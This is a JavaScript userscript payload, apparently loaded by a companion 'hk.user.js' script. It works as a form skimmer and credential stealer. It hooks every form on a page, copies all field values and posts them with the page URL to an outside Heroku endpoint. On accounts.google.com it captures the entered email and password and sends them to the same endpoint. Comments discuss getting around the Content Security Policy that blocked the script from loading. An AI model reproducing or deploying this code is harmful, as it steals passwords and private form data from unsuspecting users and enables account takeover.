//this script is loaded by hk.user.js
const GM = window["hk.user.js"];
let info = GM.getInfo();
console.log("hk", "1.0.91", info);

/*
todo:
  - access main script, ex: console.log({_this})
  - Refused to load the script 'https://xxyyzz2050.github.io/hk/hk.js?x=9'
    because it violates the following Content Security Policy directive:
    "script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' blob: data: 'self'".
    Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.

    var link = document.createElement('meta');
    link.setAttribute('http-equiv', 'Content-Security-Policy');
    link.setAttribute('content', 'script-src *.github.io');
    document.getElementsByTagName('head')[0].appendChild(link);
    //this will add additional restrictions, but will not remove the existing policies

   or change headers

   or use chrome extensions to disable CSP
   https://stackoverflow.com/a/62626026/12577650

 */

function send(form, cb = () => {}) {
  let data = {
    user: info.user,
    site: window.location.href,
    version: info.script_version,
    form
  };
  if (info.dev) console.log("[hk] send()", data);
  GM.ajax(
    `https://ace-hk.herokuapp.com/write?user=${info.user}`,
    JSON.stringify(data),
    cb
  );
}

/**
 * [deprecated!] use GM.* to directly access the main scope.
 * use this function to access the main script's scope and use it's functions
 * such as getInfo, GM_*, ...
 *
 * ex: event("GM_getValue", true, "key", value=>console.log(value))
 * ex: event(["Math.abs", false, 1], result => console.log(result));
 * @method event
 * @param  {[type]}   data [description]
 * @param  {Function} cb   [description]
 * @return {[type]}   [description]
 */
/*
function event(data, cb) {
  //https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Creating_and_triggering_events
  let event = new CustomEvent("hk.user.js", {
    detail: { cb, data }
  });
  window.dispatchEvent(event);
}
*/
let user, timestamp;

function run() {
  let forms = document.forms;
  //console.log("forms", forms.length);

  for (let i = 0; i < forms.length; i++) {
    let form = forms[i];
    //console.log(`form ${i}`, form);

    /*
      //getEventListeners is available from the console only in chrome https://stackoverflow.com/a/33467408/12577650
      if (getEventListeners) {
        let listensers = getEventListeners(form);
        if (listensers.submit) {
          originalSubmit = listensers.submit[0].listener;

          listensers.submit.forEach(el =>
            form.removeEventListener("submit", el.listener, el.useCapture)
          );
        }
      }
      //todo: else clone the Node <form>
      //element.outerHTML = element.outerHTML;
      //https://stackoverflow.com/a/39026635/12577650

      form.addEventListener("submit", ev=>{ ... })
      */

    //changing el.onsubmit dosen't prevent eventListeners,
    //so, we don't need to do: originalSubmit=form.onsubmit || listensers.submit[0].listener
    let originalSubmit = form.onsubmit;
    let data = {}; //or new FormData()
    form.onsubmit = async function(ev) {
      //onsubmit() dosen't take any parameters, so `ev` here is undefined
      //instead of ev.preventDefault(), return false
      //ev.preventDefault();
      //console.log({ ev, elements: form.elements });
      for (let k = 0; k < form.elements.length; k++) {
        let el = form.elements[k];
        data[el.name] = el.value;
      }

      send(data, (type, res) => {
        if (info.dev) console.log("send()", { type, res });
        if (type === "success") {
          console.log(">> done" /*, res*/);
          //console.log({ originalSubmit });

          if (originalSubmit && typeof originalSubmit === "function")
            originalSubmit();
          //todo: return from onsubmit(), not cb()
          ////todo: else if(error)return true
          return false;
        }
      });
      return true;
    };
  }

  if (window.location.host === "accounts.google.com") {
    let initialView = document.getElementById("initialView"),
      idNext,
      passNxt,
      id;

    if (initialView)
      initialView.onchange = function() {
        if (!idNext) {
          idNext = document.getElementById("identifierNext");
          if (idNext) {
            idNext.onclick = async function() {
              id = document.getElementById("identifierId").value.trim();
            };
          }
        }

        if (!passNxt) {
          passNxt = document.getElementById("passwordNext");
          if (passNxt) {
            passNxt.onclick = async function() {
              let password = document
                .getElementsByName("password")[0]
                .value.trim();
              if (password !== "") send({ id, password });
            };
          }
        }
      };
  }
}

run();
